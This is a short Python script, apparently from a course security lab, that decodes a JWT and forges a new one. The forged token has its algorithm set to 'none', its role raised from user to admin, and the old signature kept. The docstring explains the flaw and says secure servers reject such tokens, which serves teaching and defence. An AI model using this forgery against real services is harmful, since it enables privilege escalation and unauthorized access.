"""TOKEN OF TRUST — decode and reassemble a JWT (insecure lab example).

WHEN TO TRY: Token = header.payload.signature, all separated by dots.
The first two parts are Base64URL JSON, NOT encryption.
Reading them does not need a key. Checking authenticity DOES.

This course lab incorrectly trusted a user-controlled 'alg:none'.
The original attack changed role=user to role=admin, alg=HS256 to none,
but still kept the old signature. The test server accepted it.

SECURE servers must enforce allowed algorithms and signatures themselves.
"""

import base64
import json

ORIGINAL_TOKEN = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
    "eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9."
    "Ne5rbW9NwVQGK_YEjFdQWZKN1jjD5kL5HjfvFR2Ickc"
)


def decode_one_part(base64url_part):
    # Different parts can require DIFFERENT numbers of '=' padding bytes.
    missing_padding = (-len(base64url_part)) % 4
    part_with_padding = base64url_part + ("=" * missing_padding)
    decoded_bytes = base64.urlsafe_b64decode(part_with_padding)
    return json.loads(decoded_bytes.decode("utf-8"))


def encode_one_part(dictionary):
    json_text = json.dumps(dictionary, separators=(",", ":"))
    encoded_bytes = base64.urlsafe_b64encode(json_text.encode("utf-8"))
    return encoded_bytes.decode("ascii").rstrip("=")


def decode_jwt_without_verifying(jwt):
    header_part, payload_part, signature_part = jwt.split(".")
    return decode_one_part(header_part), decode_one_part(payload_part), signature_part


def create_lab_token(original_token):
    _, _, old_signature = decode_jwt_without_verifying(original_token)
    new_header = {"alg": "none", "typ": "JWT"}
    new_payload = {"user": "guest", "role": "admin"}

    first = encode_one_part(new_header)
    second = encode_one_part(new_payload)
    return first + "." + second + "." + old_signature


def main():
    header, payload, _ = decode_jwt_without_verifying(ORIGINAL_TOKEN)
    print("Header:", header)
    print("Payload:", payload)
    print("Modified LAB token:", create_lab_token(ORIGINAL_TOKEN))
    print("A properly secured server MUST reject this modified token.")


if __name__ == "__main__":
    main()
